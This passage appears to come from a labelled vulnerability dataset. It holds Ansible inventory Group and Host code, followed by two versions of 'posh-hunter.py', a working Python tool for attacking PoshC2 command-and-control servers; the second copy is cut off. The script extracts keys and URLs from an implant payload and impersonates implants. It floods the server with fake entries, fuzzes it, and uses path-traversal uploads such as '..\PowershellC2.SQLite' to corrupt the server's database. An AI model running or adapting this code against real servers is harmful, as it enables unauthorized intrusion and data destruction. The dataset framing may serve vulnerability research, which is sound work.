            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1,path_disclosure
18,180,e523c6418720a20eb247111d21424752f6994ee0,"posh-hunter.py/n/n#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None
  secondstage = None
  encryptionkey = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self ):
    print 'Analysing ' + self.filepath + '...'

    with open( self.filepath, 'rb' ) as f:
      decoded = PoshC2Payload.base64_walk( f.read() )
  
    # print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '"",""([^""]*)""', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h=""([^""]*)""', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s=""([^""]*)""', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    c2 = PoshC2Server()
    c2.key = self.encryptionkey
    c2.useragent = self.headers['User-Agent']
    return c2

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
   

    self.debug = False

    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    
    }
    # print headers

    import warnings
    with warnings.catch_warnings():
      warnings.simplefilter(""ignore"")
      try:
        if data:
          response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
        else:
          response = self.session.get(url, headers=headers, verify=False )
      except:
        e = sys.exc_info()[1]
        print 'Request failed: ' + str( e ), 'fail' 
        return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    # print 'IV: ', iv
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data, gzip=False ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    if gzip:
      print 'Gzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      out = StringIO.StringIO()
      with gzip.GzipFile(fileobj=out, mode=""w"") as f:
        f.write(data)
      data = out.getvalue() 

    # Pad with zeros
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    # print 'Data len: ' + str(len(data))
    data = aes.IV + aes.encrypt( data )
    if not gzip:
      data = base64.b64encode( data )
    return data

  # Decrypt a string from base64 encoding 
  def decrypt( self, data, gzip=False ):
    # iv is first 16 bytes of cipher
    print data
    iv = data[0:16]
    # data = data[16:]
    # print 'IV length: ' + str(len(iv))
    aes = self.get_encryption(iv)
    if not gzip:
      data = base64.b64decode(data)
    data =  aes.decrypt( data )
    if gzip:
      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      infile = StringIO.StringIO(data)
      with gzip.GzipFile(fileobj=infile, mode=""r"") as f:
        data = f.read()
    return data[16:]
  
  def setcookie( self, value=None ):
    if value:
      c = value
    else:
    # $o=""$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221""
      if not self.pid:
        import random
        self.pid = random.randrange(300,9999)
      c = self.domain + '\\'
      c += self.username + ';'
      c += self.username + ';' 
      c += self.machine + ';AMD64;' 
      c += str( self.pid ) + ';' 
      c += self.host
    print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    # print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o=""$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221""
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *""([^""]+)""', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *""([^""]+)""', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      self.commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( self.commsurl )

  def getimgdata( self, data ):
    # Just use one image because we don't care
    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
    maxbyteslen = 1500
    maxdatalen = 1500 + len( data )
    imagebyteslen = len(imagebytes)
    paddingbyteslen = maxbyteslen - imagebyteslen
    bytepadding = '.'.ljust(paddingbyteslen,'.')
    imagebytesfull = imagebytes + bytepadding + data
    return imagebytesfull

  def uploadfile( self, localpath, remotepath, data=None ):
    c = 'download-file '+remotepath
    self.setcookie(c)
    if data:
      filedata = data
    else:
      with open( localpath, 'rb' ) as f:
        filedata = f.read()

  #         $bufferSize = 10737418;
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
    buffersize = 10737418
    filesize = len( filedata )
    chunksize = filesize / buffersize
    import math
    totalchunks = int(math.ceil(chunksize))
    if totalchunks < 1: totalchunks = 1
    totalchunkstr = str( totalchunks ).rjust(5,'0')
    chunk = 1
    start = 0
    while chunk <= totalchunks:
      chunkstr = str( chunk ).rjust(5,'0')
      prenumbers=chunkstr + totalchunkstr
      chunkdata = filedata[start:start+buffersize]
      chunk+=1
      start += buffersize
      send = self.encrypt( prenumbers + chunkdata, gzip=True )
      uploadbytes = self.getimgdata( send )
      print 'Chunk data: ' + chunkdata
      print 'Prenumbers: ' + prenumbers
      print 'Imgdata: ' + uploadbytes
      response = self.do_request( self.commsurl, uploadbytes )
      # print response
      if len(response.strip()) > 0:
        print self.decrypt( response )
    return False  

  def wipedb( self ):
    print 'Wiping their DB...'
    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
    self.uploadfile( None, '..\oops.txt', 'oopsy' )
    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )

  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    fmt = '%Y-%m-%d %H:%M:%S'
    while True:
      self.setcookie( '' )
      data = self.do_request( url )
      if len( data.strip() ) > 0:
        try:
          cmd = self.decrypt( data )
        except:
          print 'Decrypting response failed: ' + data
        out = ''
        if 'fvdsghfdsyyh' in cmd:
          out = 'No command...'
        elif '!d-3dion@LD!-d' in cmd:
          out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
        else: 
          out = cmd
      else:
        out = 'No command...'

      print datetime.datetime.now().strftime(fmt) + ': ' + out
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, url ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.username = 'rastley'
    self.domain = 'SAW'
    self.host = 'https://bitly.com/98K8eH'
    self.spam( wordsfile, url )
 
  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, url ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
      self.machine = line
      key = self.key
      self.secondstage( url )
      self.pid = None
      self.key = key
    return True
  
  # Connect with random keys, forever
  def fuzz( self, secondstage ):
    import random
    while True:
      c = b''
      for i in range( 0, 16 ):
        c += unichr( random.randint(0, 127 ) )
      self.key = base64.b64encode( c )
      self.secondstage( secondstage )

        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description=""Find, monitor and troll a PoshC2 server"")
  parser.add_argument(""-a"", ""--analyse"", help=""Analyse an implant payload to discover C2 server"")
  parser.add_argument(""-k"", ""--key"", help=""Comms encryption key"" )
  parser.add_argument(""-U"", ""--useragent"", help=""User-agent string"" )
  parser.add_argument(""-r"", ""--referer"", help=""Referer string"" )
  parser.add_argument(""-H"", ""--host"", help=""Host name to connect to"" )
  parser.add_argument(""-g"", ""--hostheader"", help=""Host header for domain fronted servers"")
  parser.add_argument(""-d"", ""--domain"", default='WORKGROUP', help=""Windows domain name to claim to be in"")
  parser.add_argument(""-u"", ""--user"", default='user', help=""Windows user to claim to be connecting as"")
  parser.add_argument(""-m"", ""--machine"", default='DESKTOP', help=""Machine hostname to claim to be connecting as"")
  parser.add_argument(""--connect"", action='store_true', help=""Connect to the C2 as a new implant then quit"")
  parser.add_argument(""--watch"", action='store_true', help=""Connect and monitor commands as they come in"")

  parser.add_argument(""--spam"", metavar=""TEXTFILE"", help=""Spam the connected implants screen with content from this text file"")
  parser.add_argument(""--rickroll"", action='store_true', help=""Spam with the entire lyrics to Never Gonna Give You Up"")
  parser.add_argument(""--upload"", nargs=2, help=""Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)"")
  parser.add_argument(""--fuzz"", action='store_true', help=""Fuzz with random bytes"")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    c2 = payload.analyse()
    secondstage = payload.secondstage
  else:
    c2 = PoshC2Server()
    c2.useragent = args.useragent
    c2.referer = args.referer
    c2.key = args.key
    c2.host = args.host
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine

  if args.connect:
    c2.secondstage( secondstage )
    return True

  if args.watch:
    c2.secondstage( secondstage, interact=True )
    return True

  if args.rickroll:
    c2.rickroll( payload.secondstage )
    return True

  if args.upload:
    c2.secondstage( secondstage )
    c2.uploadfile( args.upload[0], args.upload[1] ) 

  if args.fuzz:
    c2.fuzz( secondstage )

if __name__ == ""__main__"":
  main()
/n/n/n",0,path_disclosure
19,181,e523c6418720a20eb247111d21424752f6994ee0,"/posh-hunter.py/n/n#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None
  secondstage = None
  encryptionkey = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self ):
    print 'Analysing ' + self.filepath + '...'

    with open( self.filepath, 'rb' ) as f:
      decoded = PoshC2Payload.base64_walk( f.read() )
  
    # print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '"",""([^""]*)""', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h=""([^""]*)""', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s=""([^""]*)""', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    c2 = PoshC2Server()
    c2.key = self.encryptionkey
    return c2

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  cookies = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
    
    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    }
    if len(self.session.cookies) > 0:
      cookies = requests.utils.dict_from_cookiejar(self.session.cookies)
      cookies['SessionID'] = self.cookie
      print 'Including cookies'
      print self.cookie

    try:
      if data:
        response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )
      else:
        response = self.session.get(url, headers=headers, verify=False )
    except:
      e = sys.exc_info()[1]
      print 'Request failed: ' + str( e ), 'fail' 
      return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data, gzip=False ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    if gzip:
      print 'Gzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      out = StringIO.StringIO()
      with gzip.GzipFile(fileobj=out, mode=""w"") as f:
        f.write(data)
      data = out.getvalue() 

    # Pad with zeros
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    # print 'Data len: ' + str(len(data))
    data = aes.IV + aes.encrypt( data )
    if not gzip:
      data = base64.b64encode( data )
    return data

  # Decrypt a string from base64 encoding 
  def decrypt( self, data, gzip=False ):
    # iv is first 16 bytes of cipher
    iv = data[0:16]
    # data = data[16:]
    # print 'IV length: ' + str(len(iv))
    aes = self.get_encryption(iv)
    if not gzip:
      data = base64.b64decode(data)
    data =  aes.decrypt( data )
    if gzip:
      print 'Gunzipping data - pre-zipped len, ' + str(len(data))
      import StringIO
      import gzip
      infile = StringIO.StringIO(data)
      with gzip.GzipFile(fileobj=infile, mode=""r"") as f:
        data = f.read()
    return data[16:]
  
  def setcookie( self, value=None ):
    if value:
      c = value
    else:
    # $o=""$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221""
      if not self.pid:
        import random
        self.pid = random.randrange(300,9999)
      c = self.domain + '\\'
      c += self.username + ';'
      c += self.username + ';' 
      c += self.machine + ';AMD64;' 
      c += str( self.pid ) + ';' 
      c += self.host
    print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o=""$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221""
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    # print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *""([^""]+)""', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *""([^""]+)""', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      self.commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( self.commsurl )

  def getimgdata( self, data ):
    # Just use one image because we don't care
    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     
    maxbyteslen = 1500
    maxdatalen = 1500 + len( data )
    imagebyteslen = len(imagebytes)
    paddingbyteslen = maxbyteslen - imagebyteslen
    bytepadding = '.'.ljust(paddingbyteslen,'.')
    imagebytesfull = imagebytes + bytepadding + data
    return imagebytesfull

  def uploadfile( self, localpath, remotepath, data=None ):
    c = 'download-file '+remotepath
    self.setcookie(c)
    if data:
      filedata = data
    else:
      with open( localpath, 'rb' ) as f:
        filedata = f.read()

  #         $bufferSize = 10737418;
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
    buffersize = 10737418
    filesize = len( filedata )
    chunksize = filesize / buffersize
    import math
    totalchunks = int(math.ceil(chunksize))
    if totalchunks < 1: totalchunks = 1
    totalchunkstr = str( totalchunks ).rjust(5,'0')
    chunk = 1
    start = 0
    while chunk <= totalchunks:
      chunkstr = str( chunk ).rjust(5,'0')
      prenumbers=chunkstr + totalchunkstr
      chunkdata = filedata[start:start+buffersize]
      chunk+=1
      start += buffersize
      send = self.encrypt( prenumbers + chunkdata, gzip=True )
      uploadbytes = self.getimgdata( send )
      print 'Chunk data: ' + chunkdata
      print 'Prenumbers: ' + prenumbers
      print 'Imgdata: ' + uploadbytes
      response = self.do_request( self.commsurl, uploadbytes )
      print response
      if len(response.strip()) > 0:
        print self.decrypt( response )
    return False  

  def wipedb( self ):
    print 'Wiping their DB...'
    self.uploadfile( None, '..\PowershellC2.SQLite', 'Appended data' )
    self.uploadfile( None, '..\oops.txt', 'oopsy' )
    self.uploadfile( None, '..\Restart-C2Server.lnk', 'oopsy' )

  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    fmt = '%Y-%m-%d %H:%M:%S'
    while True:
      data = self.do_request( url )
      cmd = self.decrypt( data )
      out = ''
      if 'fvdsghfdsyyh' in cmd:
        out = 'No command...'
      elif '!d-3dion@LD!-d' in cmd:
        out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
      else: 
        out = cmd

      print datetime.datetime.now().strftime(fmt) + ': ' + out
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, url ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.username = 'rastley'
    self.domain = 'SAW'
    self.host = 'https://bitly.com/98K8eH'
    self.spam( wordsfile, url )
 
  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, url ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')
      self.machine = line
      key = self.key
      self.secondstage( url )
      self.pid = None
      self.key = key
    return True
  
  # Connect with random keys, forever
  def fuzz( self, secondstage ):
    import random
    while True:
      c = b''
      for i in range( 0, 16 ):
        c += unichr( random.randint(0, 127 ) )
